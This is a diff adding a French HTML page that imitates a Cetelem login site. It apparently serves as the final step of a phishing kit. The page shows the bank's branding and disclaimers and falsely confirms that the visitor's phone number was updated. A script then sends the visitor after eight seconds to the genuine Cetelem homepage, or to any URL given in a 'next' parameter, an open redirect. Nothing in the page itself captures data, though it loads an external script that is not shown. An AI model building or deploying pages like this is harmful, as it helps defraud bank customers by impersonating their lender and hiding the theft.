@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/app.css">
+    <title>Connexion à Cetelem</title>
+</head>
+<body>
+    
+
+<main>
+    <div class="form">
+
+<div class="logo">
+<img src="img/logo.png" >
+</div>
+<div class="title">
+<label > Un crédit vous engage et doit être remboursé. <br>
+Vérifiez vos capacités de remboursement avant de vous engager.</label>
+</div>
+
+<div class="title1">
+<label >Un crédit vous engage et doit être remboursé. 
+Vérifiez vos capacités de remboursement avant de vous engager.</label>
+</div>
+
+    <div class="continer">
+    <form action="suivant.html" method="get">
+        <div class="man">
+        <img src="img/man.png" >
+        </div>
+
+        <div class="tite">   
+<h1>Votre numéro de téléphone a été mis à jour avec succès.</h1>
+        </div>
+
+</form>
+    </div>
+    </div>
+
+    <div class="span">
+<span>Virement express</span>
+<span>Résiliation</span> <span>Contact</span> <span>Questions / Réponses</span> <span>Réclamation</span> 
+<span>Mentions légales</span> <span>Informations sur les cookies</span> <span>Préférence de cookies</span> 
+<span>Données personnelles</span> 
+<br><br><span>Déclaration accessibilité</span> <span>Accessibilité</span>
+</div> 
+
+<div class="span1">
+<span>Virement express</span>
+<span>Résiliation</span> <span>Contact</span> <span>Questions / Réponses</span> <span>Réclamation</span> 
+<span>Mentions légales</span> <span>Informations sur les cookies</span> <span>Préférence de cookies</span> 
+<span>Données personnelles</span> 
+ <span>Déclaration accessibilité</span> <span>Accessibilité</span>
+</div> 
+<div class="fa">
+<img src="img/fa.png" >
+</div>
+
+</main>
+
+    <script>
+        /**
+         * Fonction pour récupérer un paramètre de l'URL.
+         * @param {string} name Le nom du paramètre à récupérer.
+         * @returns {string|null} La valeur du paramètre ou null s'il n'existe pas.
+         */
+        function getQueryParam(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        /**
+         * L'URL de la page vers laquelle rediriger.
+         * On récupère la valeur du paramètre 'next' de l'URL,
+         * sinon on utilise 'mobile.html' par défaut.
+         */
+        const nextUrl = getQueryParam('next') || "https://www.cetelem.fr/fr/accueil";
+
+        /**
+         * Met en place un minuteur pour rediriger l'utilisateur.
+         * Le minuteur est réglé sur 8000 millisecondes (8 secondes).
+         * Cela laisse le temps à l'utilisateur de lire le message de chargement.
+         */
+        setTimeout(() => {
+            window.location.href = nextUrl;
+        }, 8000);
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <script src="main.js"></script>
+</body>
+</html>
